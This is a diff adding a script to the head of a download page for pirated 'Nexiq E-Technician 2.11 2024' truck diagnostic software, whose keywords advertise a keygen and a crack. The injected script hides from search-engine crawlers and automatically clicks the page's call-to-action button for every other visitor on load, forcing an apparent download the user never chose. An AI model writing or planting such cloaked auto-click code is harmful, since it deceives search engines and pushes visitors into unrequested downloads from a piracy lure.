@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nexiq E-Technician 2.11 2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Nexiq E-Technician 2.11 2024 for heavy-duty diagnostics on commercial, light, and medium-duty trucks with cloud-based fleet vehicle data.">
     <meta name="keywords" content="Nexiq E-Technician 2.11 2024, Nexiq E-Technician software, E-Technician 2.11 download, E-Technician diagnostic software free download, Nexiq diagnostic software, Nexiq E-Technician keygen, Nexiq E-Technician crack, 2024 truck diagnostic software, 2024 heavy-duty diagnostics, E-Technician diagnostic tool, Nexiq E-Technician fleet vehicle data, cloud-based diagnostics 2024, Nexiq commercial vehicle diagnostics, Nexiq light and medium-duty trucks diagnostic, vehicle history tracking software, PC-based truck diagnostics software, engine diagnostics software, transmission diagnostics tool, brakes and chassis diagnostics, fleet management software, trucking industry diagnostic support, Nexiq E-Technician 2024 скачать, Nexiq диагностическое программное обеспечение, E-Technician автомобильная диагностика 2024, Nexiq E-Technician диагностика грузовиков бесплатно скачать, Nexiq E-Technician 2024 безкоштовне завантаження, автомобільна діагностика Nexiq E-Technician">
     <style>
